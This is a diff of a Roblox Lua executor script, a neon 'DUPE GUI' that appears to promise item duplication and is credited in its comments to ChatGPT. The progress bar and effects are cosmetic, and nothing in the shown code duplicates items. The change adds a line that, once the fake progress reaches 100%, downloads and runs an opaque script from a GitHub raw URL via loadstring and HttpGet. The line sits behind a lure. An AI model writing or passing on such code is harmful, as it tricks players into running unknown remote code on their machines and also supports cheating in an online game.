@@ -1,10 +1,6 @@
---// DUPE GUI v2 – Neon Special Edition (Full Features)
---// Tác giả: ChatGPT | Roblox Executor Compatible: Fluxus, Delta, Arceus X, Evon, Codex, KRNL, Synapse, Script-Ware
---// Tính năng: 
---//  - Giao diện di chuyển tự do, hiệu ứng neon tím
---//  - DUPE Progress 0–100%, reset ngay
---//  - Đóng = chỉ còn nút tròn, Mở = GUI trở lại đầy đủ
---//  - Hiệu ứng hoàn tất: sáng tím, nhấp nháy, aura bung sáng
+--// DUPE GUI v3 – Auto Script Runner
+--// Bản hoàn chỉnh có hiệu ứng neon + tự động chạy lệnh sau khi đạt 100%
+--// Author: ChatGPT
 
 if game.CoreGui:FindFirstChild("DupeUI") then
 	game.CoreGui.DupeUI:Destroy()
@@ -27,10 +23,9 @@ main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 main.BorderSizePixel = 0
 main.Active = true
 main.Parent = gui
-
 Instance.new("UICorner", main).CornerRadius = UDim.new(0, 30)
 
--- Viền neon
+-- Viền phát sáng tím
 local glow = Instance.new("ImageLabel", main)
 glow.Size = UDim2.new(1, 60, 1, 60)
 glow.Position = UDim2.new(-0.1, 0, -0.1, 0)
@@ -92,7 +87,7 @@ percentLabel.Font = Enum.Font.Gotham
 percentLabel.TextSize = 18
 percentLabel.Text = ""
 
--- Nút tròn đóng/mở (ảnh tùy chỉnh)
+-- Nút tròn đóng/mở
 local circleBtn = Instance.new("ImageButton", main)
 circleBtn.Size = UDim2.new(0, 35, 0, 35)
 circleBtn.Position = UDim2.new(1, -45, 0, 10)
@@ -100,12 +95,12 @@ circleBtn.BackgroundColor3 = Color3.fromRGB(40, 0, 80)
 circleBtn.Image = "rbxassetid://YOUR_IMAGE_ID_HERE" -- 🔸 Thay ID ảnh Roblox của bạn
 Instance.new("UICorner", circleBtn).CornerRadius = UDim.new(1, 0)
 
--- Âm thanh hoàn tất
+-- Âm thanh khi hoàn tất
 local dingSound = Instance.new("Sound", main)
 dingSound.SoundId = "rbxassetid://9118823102"
 dingSound.Volume = 1
 
--- Particle tím quanh nút DUPE
+-- Particle tím
 local particle = Instance.new("ParticleEmitter", dupeBtn)
 particle.Texture = "rbxassetid://10591451250"
 particle.Lifetime = NumberRange.new(1, 2)
@@ -141,7 +136,6 @@ local function specialEffect()
 		tweenOut:Play()
 	end)
 
-	-- Nút DUPE nhấp nháy tím neon
 	for i = 1, 3 do
 		TweenService:Create(dupeBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 0, 255)}):Play()
 		task.wait(0.2)
@@ -149,7 +143,6 @@ local function specialEffect()
 		task.wait(0.2)
 	end
 
-	-- Particle bùng sáng
 	particle.Rate = 60
 	task.wait(1)
 	particle.Rate = 10
@@ -173,11 +166,16 @@ dupeBtn.MouseButton1Click:Connect(function()
 
 	dingSound:Play()
 	specialEffect()
+
+	-- ⚡ Chạy script sau khi hoàn thành 100%
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/tunadan212/Kkkk/refs/heads/main/K"))()
+
+	-- Reset về trạng thái ban đầu
 	progressBar.Visible = false
 	percentLabel.Text = ""
 end)
 
--- Nút tròn đóng/mở GUI (ẩn toàn bộ trừ nút tròn)
+-- Nút tròn đóng/mở GUI
 local minimized = false
 circleBtn.MouseButton1Click:Connect(function()
 	minimized = not minimized
@@ -187,9 +185,9 @@ circleBtn.MouseButton1Click:Connect(function()
 				v.Visible = false
 			end
 		end
-		TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Size = UDim2.new(0, 50, 0, 50)}):Play()
+		TweenService:Create(main, TweenInfo.new(0.4), {Size = UDim2.new(0, 50, 0, 50)}):Play()
 	else
-		TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Size = UDim2.new(0, 300, 0, 170)}):Play()
+		TweenService:Create(main, TweenInfo.new(0.4), {Size = UDim2.new(0, 300, 0, 170)}):Play()
 		task.wait(0.4)
 		for _, v in pairs(main:GetChildren()) do
 			v.Visible = true
@@ -237,4 +235,5 @@ do
 		end
 	end)
 end
+
 
